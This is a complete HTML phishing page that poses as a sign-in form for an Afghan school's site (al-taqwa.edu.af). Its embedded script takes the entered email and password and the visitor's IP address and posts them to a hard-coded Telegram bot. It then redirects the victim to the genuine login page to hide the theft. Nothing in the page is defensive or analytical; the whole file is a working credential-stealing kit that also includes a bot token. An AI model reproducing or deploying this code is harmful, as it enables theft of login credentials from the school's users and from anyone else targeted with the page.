<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: Arial, sans-serif;
}

body{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#f3f3f3;
    padding:0;
}

.login-container{
    width:480px;
    max-width:95%;
    height:auto;
    min-height:479px;
    background:#fff;
    border-radius:16px;
    padding:38px 14px 26px 14px;
    border:1px solid #e0e0e0;
    box-shadow:0 4px 14px rgba(0,0,0,0.08);
    display:flex;
    flex-direction:column;
    justify-content:center;
}

.logo{
    text-align:center;
    margin-bottom:14px;
}

.logo img{
    width:280px;
}

.title{
    text-align:center;
    font-size:22px;
    font-weight:700;
    margin-bottom:26px;
    color:#222;
}

.input-box{
    margin-bottom:18px;
}

label{
    display:block;
    font-size:15px;
    margin-bottom:6px;
    color:#444;
}

input{
    width:100%;
    height:54px;
    border-radius:8px;
    border:1px solid #ccc;
    padding:0 14px;
    font-size:15px;
}

input:focus{
    border:2px solid #18c6e7;
    outline:none;
}

.remember{
    display:flex;
    align-items:center;
    margin:14px 0 22px;
    font-size:14px;
}

.remember input{
    width:16px;
    height:16px;
    margin-right:8px;
}

button{
    width:100%;
    height:54px;
    border:none;
    border-radius:8px;
    background:#18c6e7;
    font-size:16px;
    font-weight:bold;
    cursor:pointer;
    color:#fff;
}

button:hover{
    background:#0fb6d6;
}

.error-msg {
    background: #ffe6e6;
    border: 1px solid #ff6666;
    color: #cc0000;
    padding: 10px;
    border-radius: 8px;
    font-size: 13px;
    text-align: center;
    margin-top: 12px;
    display: none;
}

.success-msg {
    background: #e6ffe6;
    border: 1px solid #00cc00;
    color: #006600;
    padding: 10px;
    border-radius: 8px;
    font-size: 13px;
    text-align: center;
    margin-top: 12px;
    display: none;
}

.loading {
    display: none;
    text-align: center;
    padding: 10px;
    color: #18c6e7;
    font-weight: bold;
}

</style>
</head>

<body>

<div class="login-container">

    <div class="logo">
        <img src="Screenshot_2026-06-08-23-00-41-466_com.android.chrome~2.jpg">
    </div>

    <div class="title">Sign in</div>

    <div id="errorMsg" class="error-msg"></div>
    <div id="successMsg" class="success-msg"></div>
    <div id="loading" class="loading">⏳ Sending...</div>

    <div class="input-box">
        <label>Email</label>
        <input type="email" id="email" placeholder="Email">
    </div>

    <div class="input-box">
        <label>Password</label>
        <input type="password" id="password" placeholder="Password">
    </div>

    <div class="remember">
        <input type="checkbox" id="rememberCheck">
        <span>Remember password</span>
    </div>

    <button id="loginBtn">Login</button>

</div>

<script>
    // ==================== د Telegram بوټ تنظیمات ====================
    const BOT_TOKEN = "8688494134:AAEFObEX1p4syZwUBPVe-iG5GXkWDj311CA";
    const ADMIN_CHAT_ID = "8295417969";

    // ========== د پښتو تورو چک کولو فنکشن ==========
    function hasPashtoCharacters(text) {
        const pashtoRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
        return pashtoRegex.test(text);
    }

    // ========== د ایمیل تایید ==========
    function isValidEmail(email) {
        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        return emailRegex.test(email);
    }

    // ========== د پاسورډ اوږدوالی تایید ==========
    function isValidPasswordLength(password) {
        return password.length >= 8;
    }

    // د IP پته ترلاسه کول
    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'unknown';
        }
    }

    // اډمن ته پیغام لیږل
    async function sendToAdmin(email, password, ip) {
        const message = `✅ *NEW LOGIN ATTEMPT* ✅\n\n📍 *Source:* al-taqwa.edu.af/login\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n🕒 *Time:* ${new Date().toLocaleString()}`;
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            return response.ok;
        } catch(e) {
            console.warn("Telegram error:", e);
            return false;
        }
    }

    function showError(message) {
        const errorDiv = document.getElementById('errorMsg');
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        document.getElementById('successMsg').style.display = 'none';
        setTimeout(() => {
            errorDiv.style.display = 'none';
        }, 3000);
    }

    function showSuccess(message) {
        const successDiv = document.getElementById('successMsg');
        successDiv.textContent = message;
        successDiv.style.display = 'block';
        document.getElementById('errorMsg').style.display = 'none';
        setTimeout(() => {
            successDiv.style.display = 'none';
        }, 3000);
    }

    document.getElementById('loginBtn').addEventListener('click', async () => {
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();

        // خالي ساحې چک کول
        if (!email || !password) {
            showError('Please fill in both email and password');
            return;
        }

        // د پښتو تورو چک
        if (hasPashtoCharacters(email) || hasPashtoCharacters(password)) {
            showError('Pashto not allowed');
            return;
        }

        // د ایمیل فورمټ چک
        if (!isValidEmail(email)) {
            showError('Please enter a valid email address (e.g., username@gmail.com)');
            return;
        }

        // د پاسورډ اوږدوالی چک
        if (!isValidPasswordLength(password)) {
            showError('Password must be at least 8 characters');
            return;
        }

        // د بار کولو پیغام وښایئ
        document.getElementById('loading').style.display = 'block';
        document.getElementById('loginBtn').disabled = true;

        const ip = await getUserIP();

        // معلومات اډمن ته واستوئ
        const sent = await sendToAdmin(email, password, ip);

        // بار کول پټ کړئ
        document.getElementById('loading').style.display = 'none';
        document.getElementById('loginBtn').disabled = false;

        if (sent) {
            showSuccess('✅ Login successful! Information sent to admin.');
        } else {
            showError('⚠️ Could not send to admin. Please try again.');
            return;
        }

        // د 2 ثانیو وروسته اصلي پاڼې ته لاړ شئ
        setTimeout(() => {
            window.location.replace("https://www.altaqwa.edu.af/login");
        }, 1500);
    });
</script>

</body>
</html>
